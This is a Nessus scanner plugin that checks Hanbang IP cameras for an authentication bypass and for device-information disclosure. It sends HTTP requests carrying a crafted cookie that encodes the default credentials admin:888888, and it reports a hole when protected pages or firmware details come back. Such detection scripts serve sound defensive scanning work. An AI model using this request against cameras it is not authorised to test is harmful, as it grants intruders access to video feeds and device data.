###############################################################################
# Nessus Vulnerability Test
#
###############################################################################

if(description)
{
  script_id(51799113);
  script_version("$Revision: 10852 $");
  script_name(english:"Hanbang Information disclosure vulnerability");
  
  script_category(ACT_GATHER_INFO);
  script_copyright("This script is Copyright (C) 2005 WEBRAY");
  script_family(english:"Camera");
  script_dependencies( "http_version.nasl");
  script_set_attribute(attribute:"risk_factor", value:"Medium");
  script_require_ports("Services/www", 80);
  script_set_attribute(attribute:"solution", value:"change your password");
  script_set_attribute(
    attribute:"description",
    value:"Detect Hanbang Information disclosure vulnerability.");
  exit(0);
}
include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("webapp_func.inc");

host=get_host_name();
port=get_http_port(default:80);
#display("port=="+port);

req = string(
  'GET /doc/page/main.asp HTTP/1.1\r\n',
  'Host: ', host, '\r\n',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n',
  'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*.*;q=0.5\r\n',
  'Accept-Language: en-us,en;q=0.5\r\n',
  'Accept-Encoding: gzip,deflate\r\n',
  'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n',
  'Referer: http://', host, '/\r\n',
  'Cookie: language=zh; updateTips=true; userInfo',port,'=YWRtaW46ODg4ODg4; DevID=4\r\n',
  '\r\n'
);
req1 = string(
  'GET /ISAPI/System/deviceInfo HTTP/1.1\r\n',
  'Host: ', host, '\r\n',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n',
  'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*.*;q=0.5\r\n',
  'Accept-Language: en-us,en;q=0.5\r\n',
  'Accept-Encoding: gzip,deflate\r\n',
  'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n',
  'Referer: http://', host, '/\r\n',
  'Cookie: language=zh; updateTips=true; userInfo',port,'=YWRtaW46ODg4ODg4; DevID=4\r\n',
  '\r\n'
);


res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);	
res1 = http_keepalive_send_recv(port:port, data:req1, bodyonly:FALSE);	 

 if("200 OK"><res && ("HBimg/liveView.png"><res)){
	if (report_verbosity > 0)
	{
	  header = 'Authentication bypass with the following URL';
	  report = get_vuln_report(
		items  : "/doc/page/main.asp",
		port   : port,
		header : header
	  );
	  security_hole(port:port, extra:report);
	}
if (report_verbosity > 0) security_hole(port:port, extra:req+res);
			  else security_hole(port);
 }	

 if("200 OK"><res1 && ("firmwareReleasedDate"><res1)){
	if (report_verbosity > 0)
	{
	  header = 'Information disclosure with the following URL';
	  report = get_vuln_report(
		items  : "/ISAPI/System/deviceInfo",
		port   : port,
		header : header
	  );
	  security_hole(port:port, extra:report);
	}
if (report_verbosity > 0) security_hole(port:port, extra:req1+res1);
			  else security_hole(port);
 }	 
 

exit(0);
